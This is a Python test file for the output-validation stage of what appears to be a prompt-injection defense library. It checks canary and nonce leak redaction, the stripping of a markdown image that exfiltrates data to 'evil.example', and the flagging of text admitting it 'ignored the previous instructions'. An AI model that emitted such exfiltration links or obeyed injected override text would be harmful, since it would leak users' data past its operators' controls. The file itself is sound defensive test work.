"""Tests for stage 5 — output validation."""

from bulwark import validate_output
from bulwark.prompt import PromptContext


def _ctx(canary="BULWARK-CANARY-deadbeef", nonce="abc123", marker=None):
    return PromptContext(canary=canary, nonce=nonce, marker=marker, base64_encoded=False)


def test_canary_leak_is_unsafe_and_redacted():
    ctx = _ctx()
    out = f"Here is the summary. Also my secret token is {ctx.canary}."
    r = validate_output(out, ctx)
    assert not r.safe
    assert r.redacted
    assert ctx.canary not in r.summary
    assert any(f.category == "canary_leak" for f in r.findings)


def test_nonce_leak_redacted():
    ctx = _ctx()
    r = validate_output(f"The boundary was {ctx.nonce}.", ctx)
    assert ctx.nonce not in r.summary
    assert any(f.category == "nonce_leak" for f in r.findings)


def test_markdown_image_is_stripped():
    ctx = _ctx()
    r = validate_output("Nice page. ![x](https://evil.example/c?d=stolen)", ctx)
    assert "evil.example" not in r.summary
    assert any(f.category == "image_exfiltration" for f in r.findings)


def test_compliance_opening_flagged():
    ctx = _ctx()
    r = validate_output("Sure, I have ignored the previous instructions as asked.", ctx)
    assert any(f.category == "compliance_tell" for f in r.findings)


def test_clean_summary_passes():
    ctx = _ctx()
    r = validate_output("A concise, faithful summary of the article about foxes.", ctx)
    assert r.safe
    assert not r.redacted
    assert r.findings == []


def test_marker_normalized_back_to_space():
    ctx = _ctx(marker="▁")
    r = validate_output("word▁word", ctx)
    assert "▁" not in r.summary
    assert "word word" in r.summary
